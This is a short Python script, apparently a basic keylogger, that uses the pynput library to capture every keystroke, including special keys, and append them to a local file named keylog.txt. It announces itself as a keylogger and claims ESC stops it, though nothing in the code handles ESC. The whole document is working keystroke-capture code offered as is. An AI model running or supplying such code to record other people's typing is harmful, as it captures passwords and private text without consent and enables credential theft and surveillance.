from pynput import keyboard

# File to store logs
log_file = "keylog.txt"

def on_press(key):
    try:
        # Try to get the alphanumeric character
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # For special keys (like space, enter, ctrl)
        with open(log_file, "a") as f:
            f.write(f"[{key.name}]")
def main():
    print("Keylogger is running... Press ESC to stop.")
    
    # Start listening
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
